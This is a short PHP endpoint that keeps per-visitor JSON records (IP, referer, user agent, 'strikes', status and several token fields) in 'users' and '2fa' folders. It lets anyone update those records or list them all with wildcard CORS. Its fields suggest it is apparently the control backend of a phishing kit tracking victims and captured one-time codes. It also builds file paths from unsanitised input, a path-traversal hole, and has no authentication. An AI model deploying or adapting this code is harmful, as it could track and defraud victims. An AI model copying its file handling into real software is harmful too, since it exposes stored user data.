<?php

$base_paths = array(
    'users' => '../users/',
    '2fa' => '../users/2fa/'
);

$data_keys = ["token", "ip", "referer", "strikes", "status", "ltoken", "ctoken", "mtoken", "data1", "data2", "data3", "par1", "par2", "par3", "par4", "par5", "userAgent"];

function save_json($filename, $data) {
    file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT));
}

function load_json($filename) {
    return json_decode(file_get_contents($filename), true);
}

function get_json_files($folder) {
    $files = glob("$folder/*.json");
    $file_names = array_map(function($file) {
        return basename($file, '.json');
    }, $files);
    return $file_names;
}

if (isset($_GET['get']) && $_GET['get'] === 'url') {
    $response = [
        "domain" => $_SERVER['SERVER_NAME'],
        "directory" => dirname($_SERVER['SCRIPT_NAME'])
    ];
    header('Content-Type: application/json');
    echo json_encode($response);
    exit;
}

if (isset($_GET['users']) && $_GET['users'] === '!') {
    $json_response = array();

    foreach ($base_paths as $key => $base_path) {
        $json_response[$key] = get_json_files($base_path);
    }

    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: GET');
    header('Access-Control-Allow-Headers: Content-Type');
    
    header('Content-Type: application/json');
    echo json_encode($json_response);
    exit;
}

foreach ($data_keys as $key) {
    if (isset($_GET[$key])) {
        $token = $_GET[$key];
        $filename = $base_paths['users'] . $token . '.json';
        if (file_exists($filename)) {
            $data = load_json($filename);
            $data[$key] = $_GET[$key];
            save_json($filename, $data);
            header('Content-Type: application/json');
            echo json_encode(["message" => "success", "status" => "200 OK"]);
            exit;
        }
    }
}

if (isset($_GET['strk'])) {
    $token = $_GET['strk'];
    $filename = $base_paths['users'] . $token . '.json';
    if (file_exists($filename)) {
        $data = load_json($filename);
        $data['strikes'] = isset($data['strikes']) ? $data['strikes'] + 1 : 1;
        save_json($filename, $data);
        header('Content-Type: application/json');
        echo json_encode(["message" => "success", "status" => "200 OK"]);
        exit;
    }
}

// Nueva condición para devolver la IP del usuario
if (isset($_GET['ip'])) {
    $ip = $_SERVER['REMOTE_ADDR'];
    header('Content-Type: application/json');
    echo json_encode(["ip" => $ip]);
    exit;
}

header("HTTP/1.0 400 Bad Request");
header('Content-Type: application/json');
echo json_encode(["message" => "invalid request", "status" => "400 Bad Request"]);
?>

